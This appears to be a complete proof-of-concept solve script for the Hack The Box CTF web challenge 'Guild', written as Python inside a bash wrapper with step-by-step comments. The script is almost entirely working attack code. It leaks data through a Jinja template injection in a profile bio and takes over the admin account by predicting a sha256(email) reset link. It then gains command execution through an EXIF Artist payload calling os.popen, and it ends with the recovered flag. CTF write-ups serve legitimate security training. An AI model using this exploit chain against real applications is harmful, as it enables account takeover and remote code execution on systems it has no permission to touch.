#!/usr/bin/env bash

# Challenge: Guild
# Platform: Hack The Box - CTF Try Out
# Category: Web
# Difficulty: Easy
#
# Scenario summary:
# The application asks normal users to wait for a "Guild Master" to verify them.
# The flag is not visible to regular users, and the interesting app paths are spread
# across profile sharing, password reset, and image verification.
#
# Core concepts used in this solve:
# 1. Server-Side Template Injection (SSTI) in a shared profile page.
# 2. Predictable password-reset link generation using sha256(email).
# 3. A second SSTI sink inside EXIF metadata, reachable only after becoming admin.
#
# Real-world lesson:
# This is exactly the kind of "small issues chaining into a full compromise" flow
# defenders underestimate:
# - A "read-only" template injection leaks internal data.
# - A weak reset-link design turns that leak into account takeover.
# - An internal moderation/admin workflow becomes the privileged execution sink.
#
# Why this challenge takes more than one request:
# The first SSTI is filtered, so it is mainly useful for leaking data.
# The second SSTI is unfiltered, but it sits behind admin-only functionality.
# So the intended path is:
#   leak admin email -> generate reset token -> take admin -> abuse EXIF SSTI -> read flag
#
# Usage:
#   bash guild_poc.sh
#   bash guild_poc.sh http://154.57.164.77:31927
#
# Expected output:
#   HTB{...}
#
# Challenge files used:
# - web_guild.zip
# - unpacked Flask source in ./guild/
#
# Final flag recovered on this instance:
# HTB{mult1pl3_lo0p5_mult1pl3_h0les_58d3764773e4f939ba8933b944b2ed4d}

set -euo pipefail

BASE_URL="${1:-http://154.57.164.77:31927}"

python3 - "$BASE_URL" <<'PY'
import hashlib
import random
import re
import string
import sys

import requests
from PIL import Image

base = sys.argv[1].rstrip("/")


def rand_user():
    suffix = "".join(random.choice(string.ascii_lowercase) for _ in range(6))
    username = f"u{suffix}"
    email = f"{username}@example.com"
    password = "pass123"
    return username, email, password


def extract_share_value(html_text):
    match = re.search(r'<p class="para-class">(.*?)</p>', html_text, re.S)
    if not match:
        raise RuntimeError("Could not extract rendered profile value from share page")
    return match.group(1).strip()


def upload_image(session, path, filename):
    with open(path, "rb") as handle:
        return session.post(
            f"{base}/verification",
            files={"file": (filename, handle, "image/jpeg")},
            allow_redirects=True,
            timeout=20,
        )


# Step 1:
# Register a normal user and log in.
# We need a regular account because the first vulnerability lives in the profile-sharing feature.
user, email, password = rand_user()
user_session = requests.Session()
user_session.post(
    f"{base}/signup",
    data={"email": email, "username": user, "password": password},
    timeout=20,
)
user_session.post(
    f"{base}/login",
    data={"username": user, "password": password},
    allow_redirects=True,
    timeout=20,
)

# Step 2:
# Upload a harmless verification image so the app unlocks the profile page for our user.
# The app expects a verification record before it allows profile editing and sharing.
plain_path = "/tmp/guild_plain.jpg"
Image.new("RGB", (1, 1), (255, 255, 255)).save(plain_path, "JPEG")
upload_image(user_session, plain_path, "guild_plain.jpg")

# Step 3:
# Generate the public share link for our profile.
# The vulnerable route is /user/<username>, but the app normally creates that link for us via /getlink.
user_session.get(f"{base}/getlink", timeout=20)

# Step 4:
# Abuse the profile SSTI to leak the random admin email address.
# This works because /user/<link> takes our bio, inserts it into a template with Python string formatting,
# and then sends that result into render_template_string().
#
# The blacklist is crude and case-sensitive, but this payload avoids the blocked words.
leak_admin_email = "{{User.query.filter_by(username='admin').first().email}}"
user_session.post(f"{base}/profile", data={"bio": leak_admin_email}, timeout=20)
share_response = user_session.get(f"{base}/user/{user}", timeout=20)
admin_email = extract_share_value(share_response.text)

# Step 5:
# Seed a valid reset entry for that email.
# The forgot-password flow does not mail anything in practice here; it just creates a database row.
requests.post(f"{base}/forgetpassword", data={"email": admin_email}, timeout=20)

# Step 6:
# Predict the reset URL.
# The application uses sha256(email) directly, which is completely predictable and not tied to any secret token.
reset_hash = hashlib.sha256(admin_email.encode()).hexdigest()
new_admin_password = "GuildAdmin123!"

# Step 7:
# Reset the admin password using the predictable hash.
#
# Why this works:
# - /forgetpassword inserted a row into Validlinks for the admin email.
# - /changepasswd/<sha256(email)> accepts a POST and updates that account password.
reset_response = requests.post(
    f"{base}/changepasswd/{reset_hash}",
    data={"password": new_admin_password},
    allow_redirects=True,
    timeout=20,
)
if "Password Updated!" not in reset_response.text:
    raise RuntimeError("Admin password reset did not succeed")

# Step 8:
# Log in as admin.
# Reaching /admin confirms we took over the Guild Master account.
admin_session = requests.Session()
admin_login = admin_session.post(
    f"{base}/login",
    data={"username": "admin", "password": new_admin_password},
    allow_redirects=True,
    timeout=20,
)
if "/admin" not in admin_login.url:
    raise RuntimeError("Admin login failed")

# Step 9:
# Prepare a second verification image, but this time with malicious EXIF metadata.
# The /verify endpoint reads the EXIF Artist field and feeds it into render_template_string()
# without any blacklist at all.
#
# That makes this the real code-execution sink.
artist_payload = "{{lipsum.__globals__.os.popen('cat flag.txt').read()}}"
malicious_path = "/tmp/guild_malicious.jpg"
malicious_img = Image.new("RGB", (1, 1), (0, 0, 0))
malicious_exif = Image.Exif()
malicious_exif[315] = artist_payload
malicious_img.save(malicious_path, "JPEG", exif=malicious_exif)

# Step 10:
# Upload the malicious image as our normal user.
# Using a unique filename matters because the app stores the full path in a UNIQUE column.
upload_image(user_session, malicious_path, "guild_malicious.jpg")

# Step 11:
# Open the admin dashboard and find our latest verification request.
# The table includes both our user_id and the verification row id needed for /verify.
admin_page = admin_session.get(f"{base}/admin", timeout=20)
rows = re.findall(
    r'<td>(\d+)</td>\s*<td>' + re.escape(user) +
    r'</td>.*?name="user_id" value="\1".*?name="verification_id" value="(\d+)"',
    admin_page.text,
    re.S,
)
if not rows:
    raise RuntimeError("Could not find our verification row on the admin page")

user_id, verification_id = rows[-1]

# Step 12:
# Trigger the verification action.
# This causes the server to read our EXIF Artist field and execute the embedded Jinja payload,
# which runs `cat flag.txt` from the application working directory.
verify_response = admin_session.post(
    f"{base}/verify",
    data={"user_id": user_id, "verification_id": verification_id},
    timeout=20,
)

flag_match = re.search(r"HTB\{[^}]+\}", verify_response.text)
if not flag_match:
    raise RuntimeError("Flag was not found in the verification response")

print(flag_match.group(0))
PY
